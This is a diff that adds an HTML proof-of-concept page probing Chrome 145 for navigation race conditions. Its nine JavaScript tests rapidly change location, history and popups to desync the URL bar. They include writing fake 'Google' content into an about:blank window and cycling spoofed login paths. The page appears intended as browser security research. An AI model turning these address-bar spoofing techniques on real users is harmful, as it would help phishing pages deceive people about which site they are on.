@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>PoC: Navigation Race Conditions — Chrome 145</title>
+<style>
+  body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
+  h1 { color: #ff6b6b; }
+  h2 { color: #ffa500; }
+  .test-case { background: #16213e; border: 1px solid #333; padding: 15px; margin: 10px 0; border-radius: 5px; }
+  pre { white-space: pre-wrap; word-break: break-all; color: #7bed9f; max-height: 300px; overflow-y: auto; }
+  button { background: #e74c3c; color: #fff; border: none; padding: 8px 16px; cursor: pointer; margin: 4px; border-radius: 3px; }
+  button:hover { background: #c0392b; }
+  .warn { color: #f1c40f; font-size: 0.85em; }
+</style>
+</head>
+<body>
+<h1>PoC: Navigation Race Conditions</h1>
+<p class="warn">Target: Chrome 145 | Tests race conditions in navigation that could confuse security UI</p>
+<p class="warn">Related: CVE-2023-2721, CVE-2022-3373, CVE-2021-30598 (navigation races)</p>
+
+<h2>Test 1: Rapid location.href toggling</h2>
+<div class="test-case">
+  <p>Rapidly sets location.href back and forth between two URLs. Tests if URL bar shows stale state.</p>
+  <button onclick="test1()">Run Test (in new window)</button>
+  <pre id="t1"></pre>
+</div>
+
+<h2>Test 2: window.stop() during navigation commit</h2>
+<div class="test-case">
+  <p>Starts navigation then calls window.stop() at various timings. Tests if URL bar shows the cancelled URL.</p>
+  <button onclick="test2()">Run Test</button>
+  <pre id="t2"></pre>
+  <iframe id="t2frame" style="width:100%;height:100px;border:1px solid #555;display:none;"></iframe>
+</div>
+
+<h2>Test 3: back()/forward() rapid cycling</h2>
+<div class="test-case">
+  <p>Rapidly alternates between history.back() and history.forward() to desync URL bar state.</p>
+  <button onclick="test3()">Setup history</button>
+  <button onclick="test3b()">Start rapid cycling</button>
+  <pre id="t3"></pre>
+</div>
+
+<h2>Test 4: iframe src + location.replace race</h2>
+<div class="test-case">
+  <p>Sets iframe src and immediately calls contentWindow.location.replace. Tests which URL wins and what's displayed.</p>
+  <button onclick="test4()">Run Test</button>
+  <pre id="t4"></pre>
+  <iframe id="t4frame" style="width:100%;height:100px;border:1px solid #555;display:none;"></iframe>
+</div>
+
+<h2>Test 5: form.submit() + location change race</h2>
+<div class="test-case">
+  <p>Submits a form while simultaneously changing location. Tests navigation priority and URL bar state.</p>
+  <button onclick="test5()">Run Test</button>
+  <pre id="t5"></pre>
+  <form id="t5form" method="GET" action="about:blank" target="t5target" style="display:none;">
+    <input name="q" value="test">
+  </form>
+  <iframe name="t5target" id="t5target" style="width:100%;height:60px;border:1px solid #555;display:none;"></iframe>
+</div>
+
+<h2>Test 6: setTimeout(0) navigation cascade</h2>
+<div class="test-case">
+  <p>Queues multiple navigations via setTimeout(0). Tests microtask/macrotask ordering impact on URL bar.</p>
+  <button onclick="test6()">Run Test (new window)</button>
+  <pre id="t6"></pre>
+</div>
+
+<h2>Test 7: window.open + immediate navigation replacement</h2>
+<div class="test-case">
+  <p>Opens window to URL A then immediately tries to navigate it to URL B. Tests URL bar state.</p>
+  <button onclick="test7()">Run Test</button>
+  <pre id="t7"></pre>
+</div>
+
+<h2>Test 8: beforeunload + navigation race</h2>
+<div class="test-case">
+  <p>Uses beforeunload event handler to trigger additional navigations during page unload.</p>
+  <button onclick="test8()">Open test window</button>
+  <pre id="t8"></pre>
+</div>
+
+<h2>Test 9: requestAnimationFrame navigation timing</h2>
+<div class="test-case">
+  <p>Uses rAF to time navigation attempts at the boundary of frame rendering, when URL bar may be mid-update.</p>
+  <button onclick="test9()">Run Test</button>
+  <pre id="t9"></pre>
+</div>
+
+<script>
+function log(id, msg) {
+  const el = document.getElementById(id);
+  el.textContent += `[${performance.now().toFixed(1)}ms] ${msg}\n`;
+  el.scrollTop = el.scrollHeight;
+}
+
+// Test 1: Rapid location toggling
+function test1() {
+  const html = `<!DOCTYPE html><html><body style="font-family:monospace;padding:20px;">
+<h2>Rapid Navigation Race Test</h2>
+<pre id="log">Starting...</pre>
+<script>
+  const log = document.getElementById('log');
+  const urls = [
+    'data:text/html,<h1>Page A (Safe)</h1>',
+    'data:text/html,<h1>Page B (Different)</h1>',
+  ];
+  
+  // Record URL bar state at various points
+  let count = 0;
+  function checkState() {
+    log.textContent += '\\n[' + count + '] URL: ' + location.href.substring(0, 80);
+    count++;
+    if (count < 20) {
+      requestAnimationFrame(checkState);
+    }
+  }
+  requestAnimationFrame(checkState);
+  
+  // Attempt rapid location changes
+  // Note: only the last one should take effect, but URL bar may show intermediate states
+  setTimeout(() => {
+    for (let i = 0; i < 5; i++) {
+      try {
+        location.href = urls[i % 2];
+      } catch(e) {
+        log.textContent += '\\nError: ' + e.message;
+        break;
+      }
+    }
+  }, 500);
+<\/script>
+</body></html>`;
+
+  const blob = new Blob([html], { type: 'text/html' });
+  const url = URL.createObjectURL(blob);
+  window.open(url, '_blank');
+  log('t1', 'Opened test window. Watch for URL bar flickering/desyncs.');
+}
+
+// Test 2: window.stop() race
+function test2() {
+  const frame = document.getElementById('t2frame');
+  frame.style.display = 'block';
+
+  // Navigate to a slow-loading resource then stop
+  const timings = [0, 1, 5, 10, 50, 100];
+  let i = 0;
+
+  function nextTest() {
+    if (i >= timings.length) {
+      log('t2', 'All timing tests complete.');
+      return;
+    }
+
+    const ms = timings[i];
+    frame.src = 'about:blank';
+
+    setTimeout(() => {
+      log('t2', `Starting navigation with stop() after ${ms}ms...`);
+
+      // Navigate frame
+      frame.src = `data:text/html,<h1>Navigated page (stop after ${ms}ms)</h1>`;
+
+      // Stop after specified delay
+      setTimeout(() => {
+        try {
+          frame.contentWindow.stop();
+          log('t2', `  stop() called at ${ms}ms. Frame URL: ${frame.contentWindow.location.href}`);
+        } catch (e) {
+          log('t2', `  stop() error: ${e.message}`);
+        }
+        i++;
+        setTimeout(nextTest, 200);
+      }, ms);
+    }, 100);
+  }
+
+  nextTest();
+}
+
+// Test 3: back/forward cycling
+function test3() {
+  log('t3', 'Setting up history entries...');
+  const origUrl = location.href;
+
+  for (let i = 0; i < 10; i++) {
+    history.pushState({ i }, '', `/race-state-${i}`);
+    log('t3', `Pushed state ${i}: ${location.href}`);
+  }
+
+  log('t3', `History length: ${history.length}. Click "Start rapid cycling".`);
+}
+
+function test3b() {
+  log('t3', 'Starting rapid back/forward cycling...');
+  let ops = 0;
+  const maxOps = 50;
+
+  window.addEventListener('popstate', function handler(e) {
+    log('t3', `popstate: state=${JSON.stringify(e.state)} url=${location.href}`);
+    ops++;
+
+    if (ops < maxOps) {
+      // Randomly go back or forward
+      if (Math.random() > 0.5) {
+        history.back();
+      } else {
+        history.forward();
+      }
+    } else {
+      window.removeEventListener('popstate', handler);
+      log('t3', `Cycling complete after ${ops} operations. Final URL: ${location.href}`);
+      log('t3', 'Check: Did URL bar always match the actual page state?');
+    }
+  });
+
+  // Start cycling
+  history.back();
+}
+
+// Test 4: iframe src + location.replace race
+function test4() {
+  const frame = document.getElementById('t4frame');
+  frame.style.display = 'block';
+
+  log('t4', 'Setting iframe src and calling location.replace simultaneously...');
+
+  // Set src via attribute
+  frame.src = 'data:text/html,<h1>Page A (src attribute)</h1>';
+
+  // Immediately try to override via location.replace
+  try {
+    frame.contentWindow.location.replace('data:text/html,<h1>Page B (location.replace)</h1>');
+    log('t4', 'location.replace called immediately after src set.');
+  } catch (e) {
+    log('t4', `location.replace failed: ${e.message}`);
+  }
+
+  // Check result after load
+  frame.addEventListener('load', function handler() {
+    frame.removeEventListener('load', handler);
+    try {
+      log('t4', `Loaded URL: ${frame.contentWindow.location.href}`);
+      log('t4', `Content: ${frame.contentDocument.body.textContent}`);
+      log('t4', 'Which URL won the race?');
+    } catch (e) {
+      log('t4', `Cannot read frame: ${e.message}`);
+    }
+  });
+}
+
+// Test 5: form submit + location race
+function test5() {
+  const form = document.getElementById('t5form');
+  const target = document.getElementById('t5target');
+  target.style.display = 'block';
+
+  log('t5', 'Submitting form and changing location simultaneously...');
+
+  // Submit form
+  form.submit();
+
+  // Immediately try to navigate the target
+  try {
+    target.contentWindow.location.href = 'data:text/html,<h1>Location change won</h1>';
+    log('t5', 'location.href set after form submit.');
+  } catch (e) {
+    log('t5', `Location change failed: ${e.message}`);
+  }
+
+  target.addEventListener('load', function handler() {
+    target.removeEventListener('load', handler);
+    try {
+      log('t5', `Resulting URL: ${target.contentWindow.location.href}`);
+      log('t5', `Content: ${target.contentDocument.body.textContent}`);
+    } catch (e) {
+      log('t5', `Read failed: ${e.message}`);
+    }
+  });
+}
+
+// Test 6: setTimeout(0) cascade
+function test6() {
+  const html = `<!DOCTYPE html><html><body style="font-family:monospace;padding:20px;">
+<h2>setTimeout(0) Navigation Cascade</h2>
+<pre id="log">Starting navigation cascade...</pre>
+<script>
+  const l = document.getElementById('log');
+  
+  // Queue multiple navigations at setTimeout(0)
+  // Per spec, only the last one should execute, but implementation may differ
+  
+  let navigated = false;
+  
+  // Microtask navigation
+  Promise.resolve().then(() => {
+    l.textContent += '\\nMicrotask: pushing state /microtask';
+    history.pushState({}, '', '/microtask');
+  });
+  
+  // setTimeout(0)
+  setTimeout(() => {
+    l.textContent += '\\nsetTimeout(0): pushing state /timeout-0';
+    history.pushState({}, '', '/timeout-0');
+  }, 0);
+  
+  // setTimeout(0) - second
+  setTimeout(() => {
+    l.textContent += '\\nsetTimeout(0) #2: pushing state /timeout-0b';
+    history.pushState({}, '', '/timeout-0b');
+  }, 0);
+  
+  // Immediate
+  l.textContent += '\\nSync: pushing state /sync';
+  history.pushState({}, '', '/sync');
+  
+  // requestAnimationFrame
+  requestAnimationFrame(() => {
+    l.textContent += '\\nrAF: URL is ' + location.href;
+    l.textContent += '\\nrAF: pushing state /raf';
+    history.pushState({}, '', '/raf');
+  });
+  
+  // Check final state
+  setTimeout(() => {
+    l.textContent += '\\n\\nFinal URL: ' + location.href;
+    l.textContent += '\\nExecution order determined URL bar state.';
+    l.textContent += '\\nWas there ever a mismatch between URL bar and actual state?';
+  }, 100);
+<\/script>
+</body></html>`;
+
+  const blob = new Blob([html], { type: 'text/html' });
+  window.open(URL.createObjectURL(blob), '_blank');
+  log('t6', 'Opened. Observe navigation cascade ordering.');
+}
+
+// Test 7: window.open + immediate redirect
+function test7() {
+  log('t7', 'Opening window and immediately navigating...');
+
+  // Open to about:blank
+  const w = window.open('about:blank', '_blank');
+
+  if (w) {
+    // Immediately write spoofed content
+    w.document.write(`<!DOCTYPE html><html><body>
+      <h1>This looks like Google</h1>
+      <p>But check the URL bar!</p>
+      <p>Location: ${w.location.href}</p>
+    </body></html>`);
+    w.document.close();
+    log('t7', `Window opened to about:blank, content written.`);
+    log('t7', `URL bar should show about:blank — but user sees "Google" content.`);
+
+    // Now try to navigate it
+    setTimeout(() => {
+      try {
+        w.location.href = 'data:text/html,<h1>Navigated After Write</h1>';
+        log('t7', 'Navigated window after document.write.');
+      } catch (e) {
+        log('t7', `Navigation failed: ${e.message}`);
+      }
+    }, 1000);
+
+    // Try pushState from opener
+    setTimeout(() => {
+      try {
+        w.history.pushState({}, '', '/fake-google-path');
+        log('t7', `pushState on opened window: ${w.location.href}`);
+      } catch (e) {
+        log('t7', `pushState failed: ${e.message}`);
+      }
+    }, 500);
+  } else {
+    log('t7', 'Popup blocked. Allow popups and retry.');
+  }
+}
+
+// Test 8: beforeunload navigation
+function test8() {
+  const html = `<!DOCTYPE html><html><body style="font-family:monospace;padding:20px;">
+<h2>beforeunload Navigation Race</h2>
+<pre id="log">Page loaded.</pre>
+<button onclick="startTest()">Start Test (will navigate away)</button>
+<script>
+  const l = document.getElementById('log');
+  let testStarted = false;
+  
+  window.addEventListener('beforeunload', function(e) {
+    if (!testStarted) return;
+    l.textContent += '\\nbeforeunload fired!';
+    
+    // Try to pushState during unload
+    try {
+      history.pushState({}, '', '/during-unload');
+      l.textContent += '\\npushState during beforeunload succeeded: ' + location.href;
+    } catch(err) {
+      l.textContent += '\\npushState during beforeunload failed: ' + err.message;
+    }
+    
+    // Try to open new window during unload
+    try {
+      const w = window.open('about:blank');
+      if (w) {
+        w.document.write('<h1>Opened during beforeunload!</h1>');
+        l.textContent += '\\nwindow.open during beforeunload succeeded!';
+      }
+    } catch(err) {
+      l.textContent += '\\nwindow.open during beforeunload failed: ' + err.message;
+    }
+  });
+  
+  function startTest() {
+    testStarted = true;
+    l.textContent += '\\nStarting... will navigate in 1 second';
+    
+    // Quick pushState before navigation
+    history.pushState({}, '', '/pre-navigation');
+    l.textContent += '\\nPre-nav pushState: ' + location.href;
+    
+    setTimeout(() => {
+      location.href = 'data:text/html,<h1>Navigation completed</h1><p>What did URL bar show during transition?</p>';
+    }, 1000);
+  }
+<\/script>
+</body></html>`;
+
+  const blob = new Blob([html], { type: 'text/html' });
+  window.open(URL.createObjectURL(blob), '_blank');
+  log('t8', 'Opened test window. Click button there to start beforeunload test.');
+}
+
+// Test 9: rAF navigation timing
+function test9() {
+  log('t9', 'Testing rAF-timed pushState to exploit frame boundary...');
+  const origUrl = location.href;
+  let frame = 0;
+  const maxFrames = 60; // ~1 second at 60fps
+
+  function rafLoop(timestamp) {
+    frame++;
+
+    // pushState with different URL each frame
+    const spoofUrl = frame % 2 === 0 ? '/safe-looking-page' : '/login?redirect=dashboard';
+    try {
+      history.replaceState({ frame }, '', spoofUrl);
+    } catch (e) {
+      log('t9', `Frame ${frame} error: ${e.message}`);
+    }
+
+    if (frame % 10 === 0) {
+      log('t9', `Frame ${frame}: URL=${location.href}`);
+    }
+
+    if (frame < maxFrames) {
+      requestAnimationFrame(rafLoop);
+    } else {
+      history.replaceState({}, '', origUrl);
+      log('t9', `Completed ${maxFrames} frames. URL restored.`);
+      log('t9', 'If URL bar updates lag behind rAF, a timing window exists for spoofing.');
+    }
+  }
+
+  requestAnimationFrame(rafLoop);
+}
+</script>
+</body>
+</html>
